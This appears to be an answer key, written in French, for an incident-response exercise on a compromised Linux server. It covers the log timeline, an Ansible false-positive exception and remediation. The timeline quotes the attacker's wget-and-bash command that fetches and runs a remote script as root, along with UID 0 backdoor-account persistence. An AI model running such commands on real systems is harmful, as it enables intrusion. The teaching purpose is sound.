# Corrigé : serveur Linux compromis

## Chronologie (3 novembre, heure du serveur)
| Heure | Ce qui se passe | Signification |
|---|---|---|
| 02:11:04–02:11:22 | `Invalid user admin/webadmin/deployer` depuis 198.51.100.77 | L'attaquant cherche des noms de comptes |
| 02:11–02:14:53 | 23 × `Failed password for deploy` | Il devine le mot de passe d'un compte qui existe |
| **02:15:19** | **`Accepted password for deploy` from 198.51.100.77** | **Compromission** : mot de passe trouvé, connexion par mot de passe (interdite par la politique) |
| 02:16:54 | `sudo id` | « Suis-je root ? » : deploy a des droits sudo trop larges |
| 02:17:34–02:17:51 | `sudo wget http://203.0.113.99/u.sh -O /tmp/.u.sh`, `chmod +x`, `bash` | Téléchargement et exécution d'un script **en root** (fichier caché, avec un point) |
| 02:17:54 | `new user: name=sysupdate, UID=0` | **Un deuxième root** (persistance) |
| 02:17:56 | Mot de passe défini pour sysupdate | Il pourra revenir avec ce compte |
| 02:18:05 | `crontab (root) REPLACE` | Persistance planifiée |
| 02:20:05 | Session fermée | Opération terminée en 5 minutes |

## Ansible : faux positif, mais on ajuste finement
Le compte `ansible` se connecte par **clé**, depuis le serveur d'automatisation interne 10.10.10.60, chaque nuit à la même heure, et copie un fichier de configuration nginx validé. C'est un **faux positif**. Ajustement : une exception pour **utilisateur = ansible ET IP source 10.10.10.60 ET chemin `/tmp/ansible-tmp/`**, revue tous les 6 mois. Il ne faut **pas** exclure tout `/tmp`, ni tout `ansible` : un attaquant qui volerait la clé d'ansible serait alors invisible.

## Reconstruire plutôt que nettoyer
Un script inconnu a tourné **en root**. Il a pu installer un rootkit, modifier des binaires ou des clés SSH, et on ne peut pas prouver qu'on a tout trouvé. On collecte les preuves (image disque, logs), puis on **reconstruit** à partir d'une image saine, en appliquant les corrections : SSH par clé uniquement, sudo restreint pour deploy, nouveaux identifiants, fail2ban ou VPN devant SSH.

## Pour un manager
> Last night at 2:15, an attacker guessed the password of the "deploy" account on our web server and logged in from the internet. Within three minutes, they ran a downloaded script with administrator rights, created a hidden second administrator account and scheduled a task to keep access. We should take the server offline, keep a copy for investigation, and rebuild it from a clean image today. To stop this from happening again, we will allow only key-based logins and reduce what the deploy account can do.
